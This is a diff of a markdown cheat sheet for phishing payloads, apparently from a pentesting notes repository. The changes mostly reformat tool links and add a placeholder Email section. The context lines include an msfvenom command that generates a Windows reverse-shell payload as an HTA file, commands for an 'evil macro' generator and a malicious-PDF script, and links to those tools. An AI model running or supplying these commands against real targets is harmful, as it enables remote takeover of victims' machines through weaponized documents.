@@ -33,7 +33,7 @@ sudo msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f hta-psh -o
 python evil_macro.py -l <ip> -p <port> -o macro.txt
 ```
 
-https://github.com/rodolfomarianocy/Evil-Macro/
+- [Evil-Macro](https://github.com/rodolfomarianocy/Evil-Macro/)
 
 ## Malicious PDF
 
@@ -43,9 +43,12 @@ https://github.com/rodolfomarianocy/Evil-Macro/
 python3 malicious-pdf.py burp-collaborator-url
 ```
 
-https://github.com/jonaslejon/malicious-pdf
+- [malicious-pdf](https://github.com/jonaslejon/malicious-pdf)
 
-- evilpdf  
-https://github.com/superzerosec/evilpdf
+- [evilpdf](https://github.com/superzerosec/evilpdf)
 
-## Email 
+## Email
+
+ To come
+
+ <!--- Last Updated July 8, 2024 --->
